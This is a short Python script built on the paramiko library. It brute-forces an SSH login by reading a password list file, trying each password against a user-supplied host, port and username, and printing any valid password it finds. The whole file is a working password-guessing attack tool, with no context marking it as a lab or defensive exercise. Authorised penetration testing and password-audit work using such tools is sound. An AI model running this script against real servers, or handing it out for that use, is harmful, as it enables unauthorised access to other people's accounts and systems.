import paramiko

host = input('Enter the host: ')
port = input('Enter the port (default is 22): ') or 22
username = input('Enter the username: ')
password_file = input('Enter the path to the password list file: ')
attempts = 0

with open(password_file) as password_list:
    for password in password_list:
        password = password.strip("\n")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print("[{}] Attempting password: {}".format(attempts, password))
            ssh.connect(host, port, username, password, timeout=1)
            print("[>] Valid password found: {}".format(password))
            ssh.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[!] Invalid password!")
            attempts += 1
        except Exception as e:
            print("[!] An error occurred:", str(e))
            ssh.close()
